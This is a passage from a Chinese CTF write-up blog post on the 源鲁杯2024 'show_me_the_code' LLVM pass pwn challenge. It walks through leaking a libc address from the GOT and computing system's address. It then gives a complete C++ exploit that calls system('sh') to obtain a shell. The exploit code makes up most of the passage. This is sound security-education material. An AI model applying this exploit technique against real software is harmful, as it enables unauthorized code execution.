<h4 id="攻击思路"><a href="#攻击思路" class="headerlink" title="攻击思路"></a>攻击思路</h4><p>如果不出意外，最后肯定要利用op8构造一个<code>system(&quot;/bin/sh&quot;)</code>。那么我们就需要想办法使*(regs[6])存system的真实地址（或者附近），但是这个regs[6]不是我们能够直接操控的。唯一能看到一点希望的是op5，因为他可以通过交换数据间接控制regs[6]和regs[7]。</p>
<p>opt的got表可读可写，我们考虑从got入手泄露出libc地址。显然op7可以很容易做到这一点，然后再考虑利用运算得到system地址。先用IDA打开opt看一眼got表，我们需要找到一个已经解析过地址的函数，0x442068处的<code>__cxa_atexit</code>函数就很显眼。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> _Z10c0deVmMainv()</span><br><span class="line">&#123;</span><br><span class="line">    edoc *op = <span class="keyword">new</span> <span class="built_in">edoc</span>();</span><br><span class="line">    <span class="comment">// op1 regs[0]=memcpy@got</span></span><br><span class="line">    _ZN4edoc4addiEhii(op, <span class="number">0</span>, <span class="number">0x442050</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>先调试一下看是否成功写进去，然后发现竟然没进到vmRun，打开exp.ll文件一看，llvm帮我把函数名给改了……那就使用extern “C”避开c++的优化，这下可以了。其他声明也是同理。（吐槽，c++的函数名太长了动调看得是真的难受啊）</p>
<p>动调发现这个regs数组实际是在堆上的。并且regs[6]和regs[7]一开始就不为0，里面存了类似mmap出来的一块地址的始末地址，神奇的是他位于ld模块中间。估计是在init的时候写入的。<img src="https://c-lby.top/images/first_llvm_pass_pwn/yl-mmap%E5%A7%8B%E6%9C%AB%E5%9C%B0%E5%9D%80.png" alt="yl-mmap始末地址"><img src="https://c-lby.top/images/first_llvm_pass_pwn/yl-mmap%E5%A7%8B%E6%9C%AB%E5%9C%B0%E5%9D%80%E5%87%BA%E5%A4%84.png" alt="yl-mmap始末地址出处"></p>
<p>下面我们考虑上约束条件，尝试将<code>__cxa_atexit</code>的libc地址泄露出来。</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="type">void</span> _Z10c0deVmMainv()</span><br><span class="line">&#123;</span><br><span class="line">    edoc *op = <span class="keyword">new</span> <span class="built_in">edoc</span>();</span><br><span class="line">    <span class="comment">// op1 regs[0]=__cxa_atexit@got-0x68</span></span><br><span class="line">    _ZN4edoc4addiEhii(op, <span class="number">0</span>, <span class="number">0x442000</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// op5 regs[6]=regs[0]</span></span><br><span class="line">    _ZN4edoc4movrEhh(op, <span class="number">6</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// op1 regs[0]=__cxa_atexit@got-0x68+0x1000</span></span><br><span class="line">    _ZN4edoc4addiEhii(op, <span class="number">0</span>, <span class="number">0x443000</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// op5 regs[7]=regs[0]</span></span><br><span class="line">    _ZN4edoc4movrEhh(op, <span class="number">7</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// op7 regs[0] = *(regs[6]+0x68)</span></span><br><span class="line">    _ZN4edoc4loadEhj(op, <span class="number">0</span>, <span class="number">0x68</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://c-lby.top/images/first_llvm_pass_pwn/yl-%E5%86%99%E5%85%A5cxa_atexit%E5%9C%B0%E5%9D%80.png" alt="yl-写入cxa_atexit地址"></p>
<p>可以看到成功了。接着考虑构造system地址。system在libc中的偏移是0x50D70，__cxa_atexit是0x458C0。利用位移和加法构造system，最后将system地址放到mmap的地址上执行即可。所以一开始我们还需要把mmap的地址保存下来。</p>
<h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">edoc</span></span><br><span class="line">&#123;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// op1</span></span><br><span class="line">    <span class="comment">// idx&lt;=5</span></span><br><span class="line">    <span class="comment">// regs[idx]=num1+num2</span></span><br><span class="line">    <span class="type">void</span> _ZN4edoc4addiEhii(edoc *op, <span class="type">int8_t</span> idx, <span class="type">int</span> num1, <span class="type">int</span> num2);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// op2</span></span><br><span class="line">    <span class="comment">// idx&lt;=5 &amp;&amp; -0x1000&lt;num&lt;0x1000 &amp;&amp; isUsed[0]==0</span></span><br><span class="line">    <span class="comment">// use_once</span></span><br><span class="line">    <span class="comment">// regs[idx]+=num</span></span><br><span class="line">    <span class="type">void</span> _ZN4edoc4chgrEhi(edoc *op, <span class="type">int8_t</span> idx, <span class="type">int</span> num);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// op3</span></span><br><span class="line">    <span class="comment">// idx&lt;=5 &amp;&amp; offset&lt;0x40</span></span><br><span class="line">    <span class="comment">// choice==0: regs[idx]&gt;&gt;=offset</span></span><br><span class="line">    <span class="comment">// choice==1: regs[idx]&lt;&lt;=offset</span></span><br><span class="line">    <span class="type">void</span> _ZN4edoc4sftrEhbh(edoc *op, <span class="type">int8_t</span> idx, <span class="type">bool</span> choice, <span class="type">int8_t</span> offset);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// op4</span></span><br><span class="line">    <span class="comment">// idx1&lt;=5 &amp;&amp; idx2&lt;=5 &amp;&amp; idx3&lt;=5</span></span><br><span class="line">    <span class="comment">// regs[idx1] = regs[idx3] | regs[idx2]</span></span><br><span class="line">    <span class="type">void</span> _ZN4edoc4borrEhhh(edoc *op, <span class="type">int8_t</span> idx1, <span class="type">int8_t</span> idx2, <span class="type">int8_t</span> idx3);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// op5</span></span><br><span class="line">    <span class="comment">// idx1&lt;8 &amp;&amp; idx2&lt;8</span></span><br><span class="line">    <span class="comment">// regs[idx1] = regs[idx2]</span></span><br><span class="line">    <span class="type">void</span> _ZN4edoc4movrEhh(edoc *op, <span class="type">int8_t</span> idx1, <span class="type">int8_t</span> idx2);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// op6</span></span><br><span class="line">    <span class="comment">// idx&lt;=5 &amp;&amp; num&lt;=0x1000 &amp;&amp; num&amp;7==0 &amp;&amp; regs[6]&amp;0xfff==0 &amp;&amp; regs[7]==regs[6]+0x1000</span></span><br><span class="line">    <span class="comment">//*(regs[6]+num) = regs[idx]  //?</span></span><br><span class="line">    <span class="type">void</span> _ZN4edoc4saveEhj(edoc *op, <span class="type">int8_t</span> idx, <span class="type">int</span> num);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// op7</span></span><br><span class="line">    <span class="comment">// idx&lt;=5 &amp;&amp; num&lt;=0x1000 &amp;&amp; num&amp;7==0 &amp;&amp; regs[6]&amp;0xfff==0 &amp;&amp; regs[7]==regs[6]+0x1000</span></span><br><span class="line">    <span class="comment">// regs[idx] = *(regs[6]+num)</span></span><br><span class="line">    <span class="type">void</span> _ZN4edoc4loadEhj(edoc *op, <span class="type">int8_t</span> idx, <span class="type">int</span> num);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// op8</span></span><br><span class="line">    <span class="comment">// idx&lt;=5 &amp;&amp; num&lt;=0x1000 &amp;&amp; num&amp;7==0 &amp;&amp; regs[6]&amp;0xfff==0 &amp;&amp; regs[7]==regs[6]+0x1000</span></span><br><span class="line">    <span class="comment">//*(regs[6]+num)(regs[idx])   //break</span></span><br><span class="line">    <span class="type">void</span> _ZN4edoc4runcEhj(edoc *op, <span class="type">int8_t</span> idx, <span class="type">int</span> num);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="string">&quot;C&quot;</span> <span class="type">void</span> _Z10c0deVmMainv()</span><br><span class="line">&#123;</span><br><span class="line">    edoc *op = <span class="keyword">new</span> <span class="built_in">edoc</span>();</span><br><span class="line">    <span class="comment">// 保存mmap地址</span></span><br><span class="line">    _ZN4edoc4movrEhh(op, <span class="number">4</span>, <span class="number">6</span>);</span><br><span class="line">    _ZN4edoc4movrEhh(op, <span class="number">5</span>, <span class="number">7</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// op1 regs[0]=__cxa_atexit@got-0x68</span></span><br><span class="line">    _ZN4edoc4addiEhii(op, <span class="number">0</span>, <span class="number">0x442000</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// op5 regs[6]=regs[0]</span></span><br><span class="line">    _ZN4edoc4movrEhh(op, <span class="number">6</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// op1 regs[0]=__cxa_atexit@got-0x68+0x1000</span></span><br><span class="line">    _ZN4edoc4addiEhii(op, <span class="number">0</span>, <span class="number">0x443000</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// op5 regs[7]=regs[0]</span></span><br><span class="line">    _ZN4edoc4movrEhh(op, <span class="number">7</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// op7 regs[0] = *(regs[6]+0x68) 泄露libc</span></span><br><span class="line">    _ZN4edoc4loadEhj(op, <span class="number">0</span>, <span class="number">0x68</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// op5 regs[1]=regs[0] 备份高位</span></span><br><span class="line">    _ZN4edoc4movrEhh(op, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// op3 regs[0]&lt;&lt;=44  清空高位，只留0x458C0</span></span><br><span class="line">    _ZN4edoc4sftrEhbh(op, <span class="number">0</span>, <span class="number">1</span>, <span class="number">44</span>);</span><br><span class="line">    <span class="comment">// op3 regs[0]&gt;&gt;=44  清空高位，只留0x458C0</span></span><br><span class="line">    _ZN4edoc4sftrEhbh(op, <span class="number">0</span>, <span class="number">0</span>, <span class="number">44</span>);</span><br><span class="line">    <span class="comment">// op3 regs[0]&gt;&gt;=12  将0x458C0中的0x45移动到低位</span></span><br><span class="line">    _ZN4edoc4sftrEhbh(op, <span class="number">0</span>, <span class="number">0</span>, <span class="number">12</span>);</span><br><span class="line">    <span class="comment">// op2 regs[0]+=0xd  将0x458C0中的0x45变成0x50D70中的0x50</span></span><br><span class="line">    _ZN4edoc4chgrEhi(op, <span class="number">0</span>, <span class="number">0xd</span>);</span><br><span class="line">    <span class="comment">// op3 regs[0]&lt;&lt;=12  恢复原位</span></span><br><span class="line">    _ZN4edoc4sftrEhbh(op, <span class="number">0</span>, <span class="number">1</span>, <span class="number">12</span>);</span><br><span class="line">    <span class="comment">// op1 regs[3]=0xd70</span></span><br><span class="line">    _ZN4edoc4addiEhii(op, <span class="number">3</span>, <span class="number">0xd70</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// op4 regs[0] = regs[3] | regs[0] 合并地址</span></span><br><span class="line">    _ZN4edoc4borrEhhh(op, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// op3 regs[1]&gt;&gt;=20  清空低位，只留libc基址的高位部分</span></span><br><span class="line">    _ZN4edoc4sftrEhbh(op, <span class="number">1</span>, <span class="number">0</span>, <span class="number">20</span>);</span><br><span class="line">    <span class="comment">// op3 regs[1]&lt;&lt;=20  清空低位，只留libc基址的高位部分</span></span><br><span class="line">    _ZN4edoc4sftrEhbh(op, <span class="number">1</span>, <span class="number">1</span>, <span class="number">20</span>);</span><br><span class="line">    <span class="comment">// op4 regs[0] = regs[0] | regs[1] 合并地址</span></span><br><span class="line">    _ZN4edoc4borrEhhh(op, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 还原mmap地址</span></span><br><span class="line">    _ZN4edoc4movrEhh(op, <span class="number">6</span>, <span class="number">4</span>);</span><br><span class="line">    _ZN4edoc4movrEhh(op, <span class="number">7</span>, <span class="number">5</span>);</span><br><span class="line">    <span class="comment">// op6 *(regs[6]+0) = regs[0]  &amp;system</span></span><br><span class="line">    _ZN4edoc4saveEhj(op, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// op1 regs[3]=26739   &quot;sh&quot;</span></span><br><span class="line">    _ZN4edoc4addiEhii(op, <span class="number">3</span>, <span class="number">26739</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// op1 regs[0]=8</span></span><br><span class="line">    _ZN4edoc4addiEhii(op, <span class="number">0</span>, <span class="number">8</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">// op4 regs[0] = regs[0] | regs[4]  regs[6]+8</span></span><br><span class="line">    _ZN4edoc4borrEhhh(op, <span class="number">0</span>, <span class="number">0</span>, <span class="number">4</span>);</span><br><span class="line">    <span class="comment">// op6 *(regs[6]+8) = &quot;sh&quot;</span></span><br><span class="line">    _ZN4edoc4saveEhj(op, <span class="number">3</span>, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// op8 诸神黄昏</span></span><br><span class="line">    _ZN4edoc4runcEhj(op, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://c-lby.top/images/first_llvm_pass_pwn/yl-getshell.png" alt="yl-getshell"></p>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>我好困，睡了。再见，花了我三个钟的恶心人的题目。</p>

											<div class="article-footer-copyright">

    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0
        国际许可协议(CC BY-NC-SA 4.0) 发布.</a></br>
    因本人技术水平和知识面有限, 内容如有纰漏或者需要修正的地方, 欢迎大家指正。转载请注明来自<a href="https://c-lby.github.io" target="_blank">C_LBY's blog</a>！
</div>
							</div>

							
									
										<span data-path="/2024/first-llvm-pass-pwn/">
											<em class="post-meta-item-text"> Page View <i
													class="waline-pageview-count"></i></em>
										</span>

										
											<div>
												<center>

													<div class="pagination">

    
    
    <a href="/2024/2024GCBCTF-wp/" type="button" class="btn btn-default"><i
                class="fa fa-arrow-circle-o-left"></i> 上一页</a>
    

    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
    
    <a href="/2024/2024xsctf-QQbot-wp/" type="button" class="btn btn-default ">下一页<i
                class="fa fa-arrow-circle-o-right"></i></a>
    

    
</div>


												</center>
											</div>

											<!-- comment -->
											<!--
<section id="comment">
    <h2 class="title">留言</h2>

    
</section>

-->
											
													
														<section id="comments" class="comments">
															<!-- <link rel="stylesheet" href="https://unpkg.com/@waline/client@v2/dist/waline.css" />
<div id="waline"></div>
<script type="module">
  import { init } from 'https://unpkg.com/@waline/client@v2/dist/waline.mjs';
  var walineConfig = 
    walineConfig.el='#waline';
  Waline.init(walineConfig);
</script> -->

<link rel="stylesheet" href="https://unpkg.com/@waline/client@v2/dist/waline.css" />
<div id="waline"></div>
<script type="module">
  import { init } from 'https://unpkg.com/@waline/client@v2/dist/waline.mjs';

  init({
    enable: true,
    el: '#waline',
    serverURL: 'https://blog-s-comment-three.vercel.app',
    dark: true,
    pageview: true,
    lang: 'zh-CN',
    requiredMeta: ['nick', 'mail'],
    locale:
      { placeholder: 'Say something……' },
    highlighter: true,
    search: false,
    emoji: [
      '//unpkg.com/@waline/emojis@1.2.0/weibo',
      '//unpkg.com/@waline/emojis@1.2.0/bmoji',
      '//unpkg.com/@waline/emojis@1.2.0/bilibili',
      'https://unpkg.com/@waline/emojis@1.2.0/qq',
    ],
    imageUploader: false,
  });
</script>
														</section>
														
															
					</div> <!-- col-md-9/col-md-12 -->


					
						<div id="side_meta">
							<div class="col-md-3" id="post_meta"> 

	<!-- date -->
	
	<div class="meta-widget">
	<i class="fa fa-clock-o"></i>
	2024-11-28 
	</div>
	

	<!-- categories -->
    
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
    <ul id="categorys" class="tag_box list-unstyled collapse in">
          
  <li>
    <li><a href="/categories/llvm-pass/">llvm pass<span>1</span></a></li>
  </li>

    </ul>
	</div>
	

	<!-- tags -->
	
	<div class="meta-widget">
	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
    <ul id="tags" class="tag_box list-unstyled collapse in">	  
	    
  <li><a href="/tags/CTF/">CTF<span>25</span></a></li> <li><a href="/tags/PWN/">PWN<span>29</span></a></li> <li><a href="/tags/WP/">WP<span>18</span></a></li> <li><a href="/tags/llvm/">llvm<span>2</span></a></li> <li><a href="/tags/编译原理/">编译原理<span>1</span></a></li>
    </ul>
	</div>
		

	<!-- toc -->
	<div class="meta-widget">
	
	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
	   <div id="toc" class="toc collapse in">
		   <span class="toc-title">Contents</span>
			<ol class="toc-article"><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E5%89%8D%E6%83%85%E6%8F%90%E8%A6%81"><span class="toc-article-text">前情提要</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85"><span class="toc-article-text">环境安装</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%A6%82%E5%BF%B5%E7%9B%B8%E5%85%B3"><span class="toc-article-text">概念相关</span></a></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#CISCN2021-SATool-%E5%A4%8D%E7%8E%B0"><span class="toc-article-text">CISCN2021 SATool(复现)</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E9%81%87%E5%88%B0%E7%9A%84%E9%97%AE%E9%A2%98"><span class="toc-article-text">遇到的问题</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E8%B0%83%E8%AF%95"><span class="toc-article-text">调试</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%B0%9D%E8%AF%95"><span class="toc-article-text">尝试</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#RedHat2021-simpleVM-%E5%A4%8D%E7%8E%B0"><span class="toc-article-text">RedHat2021 simpleVM(复现)</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%88%86%E6%9E%90"><span class="toc-article-text">分析</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#EXP"><span class="toc-article-text">EXP</span></a></li></ol></li><li class="toc-article-item toc-article-level-2"><a class="toc-article-link" href="#%E6%BA%90%E9%B2%81%E6%9D%AF2024-show-me-the-code"><span class="toc-article-text">源鲁杯2024 show_me_the_code</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%88%86%E6%9E%90-1"><span class="toc-article-text">分析</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E8%8E%B7%E5%8F%96%E6%AD%A3%E7%A1%AE%E5%87%BD%E6%95%B0%E5%90%8D"><span class="toc-article-text">获取正确函数名</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#opcode%E5%88%86%E6%9E%90"><span class="toc-article-text">opcode分析</span></a></li><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E6%94%BB%E5%87%BB%E6%80%9D%E8%B7%AF"><span class="toc-article-text">攻击思路</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#EXP-1"><span class="toc-article-text">EXP</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#%E5%B0%8F%E7%BB%93"><span class="toc-article-text">小结</span></a></li></ol></li></ol>
		</div>
	
	</div>
	
    <hr>
	
</div><!-- col-md-3 -->



						</div>

						

			</div><!-- row -->

			<!--
 -->
	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  
    &copy; 2024
      鎏柏鱼's Blog
        
                powered by <a href="http://hexo.io/" target="_blank">Hexo</a> | Theme by <a
                  href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>
</p> </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>⬆︎TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



   <script type="text/javascript">      
     var search_path = "search.xml";
	 if (search_path.length == 0) {
	 	search_path = "search.xml";
	 }
	 var path = "/" + search_path;
     searchFunc(path, 'local-search-input', 'local-search-result');
   </script>

</body>
   </html>
